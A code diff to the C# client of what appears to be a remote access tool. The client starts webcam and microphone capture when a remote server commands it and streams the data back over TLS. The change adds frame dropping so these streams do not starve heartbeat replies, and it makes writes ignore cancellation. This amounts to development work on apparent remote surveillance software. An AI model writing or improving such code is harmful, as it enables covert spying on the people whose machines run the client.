@@ -202,7 +202,7 @@ internal class TlsClient : IDisposable
                 case PacketType.WcamStart:
                     var wcamCfg = System.Text.Json.JsonSerializer.Deserialize<WcamStartDataStub>(packet.Data, SeroJson.Default.WcamStartDataStub) ?? new();
                     _ = Task.Run(() => WebcamFeature.Start(wcamCfg,
-                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, CancellationToken.None)));
+                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, CancellationToken.None, dropIfBusy: true)));
                     break;
                 case PacketType.WcamStop:
                     _ = Task.Run(() => WebcamFeature.Stop());
@@ -386,7 +386,7 @@ internal class TlsClient : IDisposable
                     {
                         var micStartCopy = micStart;
                         _ = Task.Run(() => MicrophoneFeature.Start(micStartCopy.DeviceIndex, micStartCopy.SampleRate,
-                            async data => await WritePacketAsync(new Packet { Type = PacketType.MicData, Data = data }, CancellationToken.None)));
+                            async data => await WritePacketAsync(new Packet { Type = PacketType.MicData, Data = data }, CancellationToken.None, dropIfBusy: true)));
                     }
                     break;
 
@@ -1456,20 +1456,30 @@ internal class TlsClient : IDisposable
 
     // ── Packet IO ───────────────────────────────────
 
-    private async Task WritePacketAsync(Packet packet, CancellationToken ct)
+    // dropIfBusy: for continuous streams (webcam, mic) — drop the frame rather than
+    // queuing behind other sends and starving heartbeat Pong responses.
+    private async Task WritePacketAsync(Packet packet, CancellationToken ct, bool dropIfBusy = false)
     {
         if (_ssl == null) return;
-        bool acquired = false;
-        try
+        bool acquired;
+        if (dropIfBusy)
+        {
+            acquired = await _writeLock.WaitAsync(500); // 500ms — drop frame if pipe is congested
+            if (!acquired) return;
+        }
+        else
         {
             await _writeLock.WaitAsync(ct);
             acquired = true;
+        }
+        try
+        {
             var json = JsonSerializer.Serialize(packet, SeroJson.Default.Packet);
             var jsonBytes = Encoding.UTF8.GetBytes(json);
             var lengthBytes = BitConverter.GetBytes(jsonBytes.Length);
-            await _ssl.WriteAsync(lengthBytes, ct);
-            await _ssl.WriteAsync(jsonBytes, ct);
-            await _ssl.FlushAsync(ct);
+            await _ssl.WriteAsync(lengthBytes, CancellationToken.None);
+            await _ssl.WriteAsync(jsonBytes, CancellationToken.None);
+            await _ssl.FlushAsync(CancellationToken.None);
         }
         finally { if (acquired) _writeLock.Release(); }
     }
